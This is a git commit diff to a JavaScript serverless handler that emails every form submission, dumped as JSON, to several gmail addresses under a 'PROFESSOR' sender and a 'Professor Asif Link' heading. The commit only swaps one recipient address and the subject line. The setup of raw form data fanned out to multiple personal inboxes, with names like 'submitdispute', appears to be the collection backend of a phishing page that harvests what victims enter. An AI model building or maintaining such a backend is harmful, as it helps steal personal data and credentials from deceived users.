475bd9dbc92be5c0ccecdd693c872047ddcf1fd8
zm9807350 <zm9807350@gmail.com>
2026-03-24 19:48:18 +0500

    Update abid.js

--- abid.js
+++ abid.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,abidalinizamani59@gmail.com",
-      subject: "abid",
+      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,abdullahnizamani330@gmail.com",
+      subject: "Abdullah",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
         formData,
